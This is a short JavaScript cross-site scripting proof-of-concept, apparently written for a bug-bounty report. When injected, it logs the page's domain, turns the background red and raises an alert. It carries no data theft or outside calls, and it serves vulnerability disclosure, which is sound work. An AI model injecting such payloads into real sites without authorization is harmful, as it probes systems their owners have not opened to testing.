console.log("✅ XSS payload executed on: " + document.domain);
document.body.style.background = "red"; // visual proof
alert("Bug Bounty PoC on " + document.domain);
